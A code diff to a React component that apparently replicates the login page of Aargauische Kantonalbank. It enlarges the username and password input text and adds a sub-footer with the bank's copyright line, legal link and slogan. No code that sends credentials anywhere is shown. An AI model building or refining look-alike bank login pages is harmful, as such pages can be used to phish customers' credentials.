@@ -213,7 +213,7 @@ const ChAargauischeKantonalbank = () => {
                   autoComplete="username"
                   value={username}
                   onChange={(e) => setUsername(e.target.value)}
-                  className="w-full h-14 px-3 text-[15px] mb-7 focus:outline-none focus:ring-0"
+                  className="w-full h-14 px-3 text-[18px] mb-7 focus:outline-none focus:ring-0"
                   style={inputStyle}
                 />
 
@@ -230,7 +230,7 @@ const ChAargauischeKantonalbank = () => {
                   autoComplete="current-password"
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
-                  className="w-full h-14 px-3 text-[15px] mb-6 focus:outline-none focus:ring-0"
+                  className="w-full h-14 px-3 text-[18px] mb-6 focus:outline-none focus:ring-0"
                   style={inputStyle}
                 />
 
@@ -384,6 +384,32 @@ const ChAargauischeKantonalbank = () => {
             </div>
           </div>
         </footer>
+
+        {/* Sub-footer */}
+        <div style={{ background: "#c8c8c8", color: "#333" }}>
+          <div className="max-w-[1200px] mx-auto px-4 md:px-6 py-4 flex flex-wrap items-center justify-between gap-3">
+            <div className="flex items-center text-[14px]">
+              <span>© 2026 Aargauische Kantonalbank</span>
+              <span
+                aria-hidden
+                style={{ display: "inline-block", width: 1, height: 14, background: "#666", margin: "0 12px" }}
+              />
+              <a
+                href="https://www.akb.ch/rechtliches"
+                target="_blank"
+                rel="noopener noreferrer"
+                className="hover:underline"
+                style={{ color: "#333" }}
+              >
+                Rechtliches
+              </a>
+            </div>
+            <div className="text-[18px] font-semibold italic" style={{ color: "#0069a7" }}>
+              Am richtigen Ort.
+            </div>
+          </div>
+        </div>
+
       </div>
     </>
   );
